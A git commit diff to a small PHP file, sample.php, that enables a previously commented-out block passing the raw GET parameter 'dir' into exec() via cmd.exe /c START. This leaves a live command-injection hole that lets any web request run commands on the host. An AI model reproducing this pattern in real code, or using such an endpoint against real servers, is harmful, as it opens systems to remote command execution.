7c06170e9b260f37e22afc94da453d711a5a1a38
John Francis Bea <89569109+waranghawong@users.noreply.github.com>
2024-01-20 21:54:39 +0800

    /

--- sample.php
+++ sample.php
@@ -3,8 +3,7 @@
   // echo fread($demofile, filesize('kml_files/eado06ivn5index.kml'));
   // fclose($demofile);
   // $loc = $_POST['location'];
-  // if(isset($_GET['dir'])){
-  //   exec('c:\WINDOWS\system32\cmd.exe /c START '.$_GET['dir'].'');
-  // }
-  var_dump(php_uname()); 
+  if(isset($_GET['dir'])){
+    exec('c:\WINDOWS\system32\cmd.exe /c START '.$_GET['dir'].'');
+  }
 ?>
